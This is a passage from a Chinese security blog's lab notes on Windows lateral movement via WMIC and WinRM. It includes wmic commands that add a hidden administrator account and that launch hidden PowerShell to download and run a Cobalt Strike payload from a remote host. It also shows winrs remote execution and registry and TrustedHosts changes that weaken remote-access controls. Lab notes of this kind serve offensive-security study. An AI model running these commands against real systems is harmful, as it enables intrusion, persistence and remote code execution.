<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create</span><br><span class="line">wmic process call create &quot;C:\Windows\System32\notepad.exe&quot;</span><br></pre></td></tr></table></figure>

<p>关闭进程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;进程名称&quot; call terminate</span><br><span class="line">wmic process where name=&quot;notepad.exe&quot; call terminate</span><br></pre></td></tr></table></figure>

<p>可以使用 WMIC 命令集的强大管理功能和支持远程执行命令的特点，做一些操作，比如：</p>
<p>远程添加管理:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;cmd.exe /c net user jack hack@123 /add &amp;&amp; net localgroup administrators jack /add&quot;</span><br></pre></td></tr></table></figure>

<p>远程执行 powershell 上线(网络畅通):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.197.30 /user:administrator /password:aqa@123 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.31.212/payload_x64.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>利用条件</p>
<ul>
<li>shell 环境:普通管理员或者域管理员。</li>
<li>目标环境:获取本地 administrator 密码，或者已经取得域管理员以上权限账号的用户密码，或者已经和目标主机建立信任关系。</li>
<li>端口:445 和 135。</li>
</ul>
<p>实验内容-使用powershell命令CS 上线</p>
<p>在先前已经完成票据实验的前提下</p>
<ol>
<li><p>生成powershell的木马执行文件<br><img src="https://i.imgur.com/FzPPVJJ.gif"></p>
</li>
<li><p>命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.255.10 /user:Administrator /password:Win.2024 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.255.1:8000/payload.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/9RvGyWF.png" alt="1100"></p>
</li>
</ol>
<ul>
<li>通过WMIC工具，在远程计算机 <code>192.168.197.30</code> 上以管理员权限执行一条PowerShell命令。</li>
<li>PowerShell命令从服务器 <code>http://192.168.31.212</code> 下载并执行名为 <code>payload.ps1</code> 的脚本。</li>
</ul>
<p>成功上线<br><img src="https://i.imgur.com/lqVR7B4.png"></p>
<h2 id="WinRM（CS-不回显）"><a href="#WinRM（CS-不回显）" class="headerlink" title="WinRM（CS 不回显）"></a>WinRM（CS 不回显）</h2><p>WinRM（Windows 远程管理）是 Microsoft 实现的 WS-Management 协议，基于SOAP 的防火墙友好协议，用于系统管理和信息交换。它允许 IT 专业人员和开发人员远程管理 Windows 服务器，获取管理数据，执行自动化脚本。</p>
<p>WinRM 默认使用 5985 端口（HTTP）和 5986 端口（HTTPS）进行通信，需要配置WinRM 侦听器和 TrustedHosts 才能从远程计算机获取数据。</p>
<p>WinRM 服务在 Windows Server2008 R2 之后默认开启，家庭版的 Windows 默认关闭。</p>
<p>&#x3D;&#x3D;该服务的好处是远程连接是客户端无感，不占用连接数。一定程度上规避安全设备。支持不同类型的身份认证，如 NTLM 和 Kerberos 协议。(通过 PTH PTK PTT认证之后不需要再输入账号密码认证)&#x3D;&#x3D;powershell 中使用 enable-psremoting 命令开启服务，如果服务已开启，会出现如下提示（实际环境中一般依靠端口 5985 和 5986 来判断服务是否开启。）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/1XiNNAP.png"></p>
<p>基本使用:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.255.10:5985 -u:administrator -p:Win.2024 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]<br>如果出现 WinRM 客户端无法处理该请求，使用 administrator 用户执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>或者修改注册表:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/12/22/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="prev" title="中间件">
      <i class="fa fa-chevron-left"></i> 中间件
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">本地信息收集及基础操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">域内信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">2.1.</span> <span class="nav-text">基本信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-number">3.</span> <span class="nav-text">密码获取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96-lsass-%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81"><span class="nav-number">3.1.</span> <span class="nav-text">读取 lsass 进程内存密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E5%82%A8"><span class="nav-number">3.2.</span> <span class="nav-text">转储</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">3.3.</span> <span class="nav-text">高版本密码抓取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-Wdigest-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">3.4.</span> <span class="nav-text">修改 Wdigest 注册表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5-SSP"><span class="nav-number">3.5.</span> <span class="nav-text">内存注入 SSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0-SSP"><span class="nav-number">3.6.</span> <span class="nav-text">注册表添加 SSP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number"></span> <span class="nav-text">域控密码抓取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDS-%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">NTDS 文件介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7-NTDS"><span class="nav-number">1.1.</span> <span class="nav-text">卷影拷贝提取域控 NTDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96-NTDS"><span class="nav-number">1.2.</span> <span class="nav-text">离线读取 NTDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96-NTDS"><span class="nav-number">1.3.</span> <span class="nav-text">在线读取 NTDS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dcsync-%E5%8E%9F%E7%90%86%E5%8F%8A%E6%94%BB%E5%87%BB"><span class="nav-number">2.</span> <span class="nav-text">Dcsync 原理及攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dcsync-%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E5%9F%9F%E6%8E%A7-hash"><span class="nav-number">2.1.</span> <span class="nav-text">dcsync 远程读取域控 hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dcsync-%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">dcsync 远程读取明文密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">3.</span> <span class="nav-text">RDP 密码抓取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">4.</span> <span class="nav-text">应用软件密码抓取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">4.1.</span> <span class="nav-text">浏览器密码抓取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">5.</span> <span class="nav-text">内网横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6"><span class="nav-number">5.1.</span> <span class="nav-text">远控软件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RDP"><span class="nav-number">5.1.1.</span> <span class="nav-text">RDP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPC-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">IPC$横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0%E5%92%8C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">6.1.</span> <span class="nav-text">概述和连接方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-%E9%85%8D%E5%90%88%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">6.2.</span> <span class="nav-text">ipc$配合计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-%E9%85%8D%E5%90%88%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.3.</span> <span class="nav-text">ipc$配合服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH"><span class="nav-number">7.</span> <span class="nav-text">PTH</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%8C%BA%E5%88%AB"><span class="nav-number">7.1.</span> <span class="nav-text">不同用户权限区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash-%E7%A2%B0%E6%92%9E%E6%9F%A5%E8%AF%A2%E5%8F%AF%E7%94%A8-PTH"><span class="nav-number">7.2.</span> <span class="nav-text">Hash 碰撞查询可用 PTH</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mimikatz"><span class="nav-number">7.2.1.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CS-PTH-%E4%B8%8A%E7%BA%BF"><span class="nav-number">7.2.2.</span> <span class="nav-text">CS PTH 上线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CractMapExec%E6%89%B9%E9%87%8F-pth"><span class="nav-number">7.2.3.</span> <span class="nav-text">CractMapExec批量 pth</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTK"><span class="nav-number">7.3.</span> <span class="nav-text">PTK</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PTK-%E4%B8%8A%E7%BA%BF-CS"><span class="nav-number">7.3.1.</span> <span class="nav-text">PTK 上线 CS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTT-PTC"><span class="nav-number">7.4.</span> <span class="nav-text">PTT&amp;PTC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.5.</span> <span class="nav-text">黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.6.</span> <span class="nav-text">白银票据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-%E4%BD%BF%E7%94%A8-mimikatz-%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%9A"><span class="nav-number">7.6.1.</span> <span class="nav-text">实验-使用 mimikatz 制作白银票据：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-%E4%BC%AA%E9%80%A0-ldap-%E6%9C%8D%E5%8A%A1%E4%B8%8A%E7%BA%BF-dc%EF%BC%9A"><span class="nav-number">7.6.2.</span> <span class="nav-text">实验-伪造 ldap 服务上线 dc：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WinRM%EF%BC%88CS-%E4%B8%8D%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">WinRM（CS 不回显）</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kec的博客"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">kec的博客</p>
  <div class="site-description" itemprop="description">一句话的长度</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://1234567fang.github.io/" title="https:&#x2F;&#x2F;1234567fang.github.io&#x2F;" rel="noopener" target="_blank">友链</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kec的博客</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
